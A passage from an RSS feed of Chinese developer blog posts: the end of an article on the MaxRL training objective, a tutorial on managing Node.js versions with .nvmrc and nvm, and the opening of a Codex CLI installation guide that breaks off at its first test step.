<p>进一步的实验结果表明，MaxRL 的优势并不依赖于过于理想化的实验条件，即使在反馈存在噪声或验证信号并非完全可靠的设置下，MaxRL 仍然能够保持相对稳定的性能优势。</p>
<p>总体来看，MaxRL 为不可微、基于采样的学习问题提供了一种更为深入的解法。它通过一个随计算量自然扩展的目标框架，系统性地逼近真正的似然优化。</p>
<p>当优化目标本身可以随算力演进、逐步逼近最大似然，强化学习究竟会成为通往通用智能的长期答案，还是只是通往下一个训练范式的过渡方案？</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[《告别“我电脑上好好的”：.nvmrc 让 Node.js 版本管理变轻松》]]></title>    <link>https://juejin.cn/post/7603160727717953587</link>    <guid>https://juejin.cn/post/7603160727717953587</guid>    <pubDate>2026-02-05T09:39:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603160727717953587" data-draft-id="7603185231801483290" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="《告别“我电脑上好好的”：.nvmrc 让 Node.js 版本管理变轻松》"/> <meta itemprop="keywords" content="前端,Node.js"/> <meta itemprop="datePublished" content="2026-02-05T09:39:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="leafyyuki"/> <meta itemprop="url" content="https://juejin.cn/user/2172290706728829"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            《告别“我电脑上好好的”：.nvmrc 让 Node.js 版本管理变轻松》
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2172290706728829/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    leafyyuki
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T09:39:47.000Z" title="Thu Feb 05 2026 09:39:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    17
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在团队协作开发 Node.js 项目时，你是否经常遇到这些烦心事？</p>
<ul>
<li>“这个模块在我电脑上运行正常，怎么到你那就报错了？”</li>
<li>“我刚更新了 Node 版本，为什么老项目跑不起来了？”</li>
<li>每切换一个项目，就要查一下它用的 Node 版本，然后手忙脚乱地切换。</li>
</ul>
<p>如果你的答案是“是”，那么  **<code>.nvmrc</code>**​ 文件就是你一直在寻找的“版本一致性”解决方案。配合 Node 版本管理工具 <strong>nvm</strong>，它能帮你彻底告别环境混乱。本文将带你轻松掌握这套最佳实践。</p>
<h3 data-id="heading-0">什么是 nvm 与 .nvmrc？</h3>
<p><strong>nvm (Node Version Manager)</strong> ​ 是一个命令行工具，允许你在同一台机器上安装和切换多个版本的 Node.js。它完美解决了不同项目需要不同 Node 运行环境的难题。</p>
<p>而  **<code>.nvmrc</code>**​ 文件则是一个“版本说明书”。你只需在项目根目录创建这个文件，并在里面写上项目所需的 Node.js 版本号（如 <code>v20.10.0</code>）。此后，任何人或任何工具（包括你的队友、CI/CD 流水线）进入这个项目，都能通过一条简单的命令 <code>nvm use</code>，快速切换到正确的版本。</p>
<h3 data-id="heading-1">快速上手：3步建立版本规范</h3>
<p>整个核心流程可以概括为以下三个步骤：</p>
<pre><code class="hljs language-css" lang="css">flowchart <span class="hljs-selector-tag">TD</span>
    <span class="hljs-selector-tag">A</span><span class="hljs-selector-attr">[开始: 使用.nvmrc]</span> --&gt; <span class="hljs-selector-tag">B</span><span class="hljs-selector-attr">[在项目根目录创建.nvmrc文件]</span>
    <span class="hljs-selector-tag">B</span> --&gt; C<span class="hljs-selector-attr">[在文件中写入Node.js版本号]</span>
    C --&gt; D<span class="hljs-selector-attr">[在终端执行nvm use]</span>
    D --&gt; E{版本是否已安装?}
    E -- 是 --&gt; F<span class="hljs-selector-attr">[成功切换到指定版本]</span>
    E -- 否 --&gt; G<span class="hljs-selector-attr">[自动安装指定版本]</span>
    G --&gt; F
    F --&gt; H<span class="hljs-selector-attr">[在当前目录及其子目录下项目使用指定版本]</span>
</code></pre>
<p><strong>1. 创建 <code>.nvmrc</code>文件</strong></p>
<p>在你的项目根目录下，运行命令创建文件并指定版本。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 指定精确版本（推荐，确保完全一致）</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"v20.10.0"</span> &gt; .nvmrc

<span class="hljs-comment"># 或使用主版本号（将使用20.x.x中的最新版）</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"20"</span> &gt; .nvmrc

<span class="hljs-comment"># 或使用LTS版本（将使用当前的长期支持版）</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"lts/*"</span> &gt; .nvmrc
</code></pre>
<p><strong>2. 使用指定版本</strong></p>
<p>在项目目录下，执行：</p>
<pre><code class="hljs language-perl" lang="perl">nvm <span class="hljs-keyword">use</span>
</code></pre>
<p>nvm 会自动读取 <code>.nvmrc</code>文件并切换版本。如果该版本未安装，nvm 会给出明确的安装提示。</p>
<p><strong>3. 提交到代码仓库</strong></p>
<p>将 <code>.nvmrc</code>文件提交到 Git 等版本控制系统中。这是<strong>团队协作中至关重要的一步</strong>，确保每位开发者都能使用相同的 Node.js 环境。</p>
<h3 data-id="heading-2">进阶技巧：让版本切换“自动化”</h3>
<p>如果你厌倦了每次进入项目都要手动输入 <code>nvm use</code>，可以通过配置 Shell 实现<strong>全自动切换</strong>。</p>
<p>将以下脚本添加到你的 <code>~/.zshrc</code>或 <code>~/.bashrc</code>文件末尾（放在 nvm 初始化语句之后）：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 置于 ~/.zshrc 或 ~/.bashrc 中</span>
<span class="hljs-built_in">autoload</span> -U add-zsh-hook
load-<span class="hljs-function"><span class="hljs-title">nvmrc</span></span>() {
  <span class="hljs-built_in">local</span> nvmrc_path=<span class="hljs-string">"<span class="hljs-subst">$(nvm_find_nvmrc)</span>"</span>
  <span class="hljs-keyword">if</span> [ -n <span class="hljs-string">"<span class="hljs-variable">$nvmrc_path</span>"</span> ]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">local</span> nvmrc_node_version=$(nvm version <span class="hljs-string">"<span class="hljs-subst">$(cat <span class="hljs-string">"<span class="hljs-variable">${nvmrc_path}</span>"</span>)</span>"</span>)
    <span class="hljs-keyword">if</span> [ <span class="hljs-string">"<span class="hljs-variable">$nvmrc_node_version</span>"</span> = <span class="hljs-string">"N/A"</span> ]; <span class="hljs-keyword">then</span>
      nvm install
    <span class="hljs-keyword">elif</span> [ <span class="hljs-string">"<span class="hljs-variable">$nvmrc_node_version</span>"</span> != <span class="hljs-string">"<span class="hljs-subst">$(nvm version)</span>"</span> ]; <span class="hljs-keyword">then</span>
      nvm use
    <span class="hljs-keyword">fi</span>
  <span class="hljs-keyword">elif</span> [ <span class="hljs-string">"<span class="hljs-subst">$(nvm version)</span>"</span> != <span class="hljs-string">"<span class="hljs-subst">$(nvm version default)</span>"</span> ]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"切换回 nvm 默认版本"</span>
    nvm use default
  <span class="hljs-keyword">fi</span>
}
add-zsh-hook chpwd load-nvmrc
load-nvmrc
</code></pre>
<p>保存后执行 <code>source ~/.zshrc</code>。配置完成后，你的终端会在进入项目目录时自动切换 Node 版本，离开时切回默认版本，实现“无感”切换。</p>
<h3 data-id="heading-3">融入开发生命周期</h3>
<p><strong>团队规范</strong>：在团队中，应将“项目必须包含 <code>.nvmrc</code>文件”作为一项强制约定。这是成本最低、效果最显著的统一开发环境的方法。</p>
<p><strong>CI/CD 集成</strong>：在自动化构建和部署流程中，<code>.nvmrc</code>同样能发挥作用。例如，在 GitHub Actions 中，你可以直接使用它来设置 Node 环境：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">使用</span> <span class="hljs-string">.nvmrc</span> <span class="hljs-string">设置</span> <span class="hljs-string">Node.js</span>
  <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/setup-node@v3</span>
  <span class="hljs-attr">with:</span>
    <span class="hljs-attr">node-version-file:</span> <span class="hljs-string">'.nvmrc'</span>
</code></pre>
<p><strong>双保险策略</strong>：你还可以在 <code>package.json</code>中用 <code>engines</code>字段再次声明 Node 版本范围，让包管理器（如 yarn、pnpm）也参与版本检查。</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"engines"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"node"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"&gt;=20.10.0 &lt;21"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-4">最佳实践总结</h3>
<ol>
<li><strong>精确版本</strong>：为生产项目在 <code>.nvmrc</code>中指定<strong>精确版本号</strong>（如 <code>v20.10.0</code>），而非模糊的主版本号，这是杜绝意外的最可靠方式。</li>
<li><strong>个人必配自动切换</strong>：强烈建议每位开发者都配置 Shell 自动切换，这将极大提升开发体验。</li>
<li><strong>团队必提交 .nvmrc</strong>：将 <code>.nvmrc</code>视为项目必需品，如同 <code>package.json</code>一样提交到代码库。</li>
<li><strong>环境穿透</strong>：在 Dockerfile、CI 配置等所有环境定义中，都优先读取 <code>.nvmrc</code>来设置 Node 版本，实现从开发到生产的全链路一致。</li>
</ol>
<p>通过 <code>nvm</code>和 <code>.nvmrc</code>这套简单而强大的组合拳，你可以轻松管理复杂的 Node.js 版本环境。无论是个人项目还是大型团队协作，它都是保障开发顺畅、减少无谓调试时间的基础设施。现在就为你手头的项目创建一个 <code>.nvmrc</code>文件吧！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[GPT Codex怎么用？国内如何使用？最全CLI使用教程与高效技巧]]></title>    <link>https://juejin.cn/post/7603010441149743145</link>    <guid>https://juejin.cn/post/7603010441149743145</guid>    <pubDate>2026-02-05T09:56:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603010441149743145" data-draft-id="7603142147642851371" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="GPT Codex怎么用？国内如何使用？最全CLI使用教程与高效技巧"/> <meta itemprop="keywords" content="AI编程"/> <meta itemprop="datePublished" content="2026-02-05T09:56:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="爱吃的小肥羊"/> <meta itemprop="url" content="https://juejin.cn/user/2637045249608064"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            GPT Codex怎么用？国内如何使用？最全CLI使用教程与高效技巧
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2637045249608064/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    爱吃的小肥羊
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T09:56:00.000Z" title="Thu Feb 05 2026 09:56:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>如果你是一名程序员，大概知道OpenAI的Codex，最近关于Codex和Claude code谁更厉害的争得是愈演愈烈，虽然大家都在说Claude code好用，但是不乏一些资深的程序员说Codex好用。</p>
<p>给出的原因很简单：Codex的bug更少，上下文更长，唯一的缺点就是太慢了。</p>
<p>这里紧急插播一条新闻：GPT的模型已经提速了，提升了40%。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3df734e8a6fe47a99022f310f20273b0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54ix5ZCD55qE5bCP6IKl576K:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890161&amp;x-signature=ExNRpdU3Scp0rb45HkFquBGFxLE%3D" alt="" loading="lazy"/></p>
<p>最近，Codex发布了macOS应用，这意味着国内越来越多的开发者可以便捷地使用它。不过很多人刚开始接触Codex时往往一脸懵它怎么安装？怎么用？为什么有这么多配置参数？</p>
<p>本文就来系统解决这些问题。我会从Codex的基本概念讲起，手把手教你在本地快速部署CLI环境，最后再分享15个我在实际开发中总结的高效使用技巧。这些技巧涵盖从快捷操作到高级配置，足以让你从新手升级到进阶用户。</p>
<p>如果你还想要使用Claude code，可以看我另外一篇文章，有介绍三种方法。</p>
<p>相关阅读：</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1992313721415046720" target="_blank" title="https://zhuanlan.zhihu.com/p/1992313721415046720" ref="nofollow noopener noreferrer">手把手教你在国内使用 Claude Code：不封号、不折腾、比官网更便宜</a></p>
<hr/>
<h2 data-id="heading-0">一Codex是什么？为什么值得关注</h2>
<p>Codex应该是OpenAI专为编程打造的AI模型。和通用的ChatGPT相比，它有几个明显优势。代码理解和生成能力远超通用模型，能准确把握编程逻辑、语法规范和最佳实践。</p>
<p>支持40多种编程语言，Python、JavaScript、Go都能轻松搞定。更关键的是，它不仅生成代码，还能理解代码、调试错误、重构逻辑基本是个高级程序员的升级版。</p>
<p>你可以在终端里敲命令（CLI），也可以在VS Code里弹出AI建议（IDE插件），还可以通过SDK集成到自己的应用，或者直接上网页用（云端）。本文主要讲CLI方案，因为它给开发者最大的灵活性。</p>
<p>虽然说得很AI感，但是用户唯一认可它的，就是好用。</p>
<hr/>
<p>那它到底能怎么用？</p>
<h2 data-id="heading-1">二、哪些用户可以使用Codex</h2>
<p>目前只有付费用户才能使用Codex，比如Plus、Pro、Team等会员，如果你还不会开通会员，可以看我之前的文章。</p>
<p>相关阅读：</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F2002399500036219170" target="_blank" title="https://zhuanlan.zhihu.com/p/2002399500036219170" ref="nofollow noopener noreferrer">ChatGPT如何充会员？WildAI、Google Play、礼品卡5种方法实测对比</a></p>
<p>那免费用户可以用吗？其实也可以，只不过需要搭配着OpenAI的API才能用，在后面的使用技巧那里有详细的介绍，感兴趣的可以看看。</p>
<p>Codex安装教程，CLI环境快速上手：从零到启动</p>
<p>第一步：安装Node.js</p>
<p>Codex CLI基于Node.js开发，因此你首先需要在本地安装它。访问<a href="https://link.juejin.cn?target=https%3A%2F%2Fnodejs.org%2F" target="_blank" title="https://nodejs.org/" ref="nofollow noopener noreferrer">Node.js官网</a>，按照你的系统版本（Windows/Mac/Linux）下载合适的安装程序。由于涉及命令行工具链，建议下载LTS长期支持版本，稳定性更好。</p>
<p>安装完成后，打开终端验证一下：</p>
<p>node -v npm -v<br/>
能看到版本号就说明安装成功了。</p>
<p>第二步：安装Codex CLI</p>
<p>现在用npm全局安装Codex：npm i -g @openai/codex</p>
<p>得到如下结果：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f0525070b4024f2caf30dc51dad6eb2c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54ix5ZCD55qE5bCP6IKl576K:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890161&amp;x-signature=B4iIIFCSTCRkc%2BDgOf01Y%2F637Y0%3D" alt="" loading="lazy"/></p>
<p>这条命令会从npm仓库下载Codex包并全局安装，这样你在任何目录下都能直接使用<code>codex</code>命令。安装可能需要一两分钟，取决于你的网络。</p>
<p>第三步：登录与验证</p>
<p>安装好后，在终端输入：codex</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7862f2ca484f451a8393615090ca415e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54ix5ZCD55qE5bCP6IKl576K:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890161&amp;x-signature=nOan0wSq0MhvXRnv%2BF16OWistNw%3D" alt="" loading="lazy"/><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/74aac8db0a6c48959c4030c4da434b9b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54ix5ZCD55qE5bCP6IKl576K:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890161&amp;x-signature=GbSbBcWjlNUHLCY%2BQGTIf%2FeszFY%3D" alt="" loading="lazy"/></p>
<p>返回命令行窗口 ，显示如下界面</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8a28b309e87c461c9f8473a6108448ed~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54ix5ZCD55qE5bCP6IKl576K:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890161&amp;x-signature=O0ndIzrPoBJSxc1QdoWE0TQAGFA%3D" alt="" loading="lazy"/></p>
<p>一直回车</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0c0dd8ad8a474f32b6ad9a6e98a9cb34~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54ix5ZCD55qE5bCP6IKl576K:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890161&amp;x-signature=w7vUdiGKCV9feOj4uJd0epZTrn0%3D" alt="" loading="lazy"/></p>
<p>输入hello测试一下，能正常返回结果即表示能够正常使用：</p>
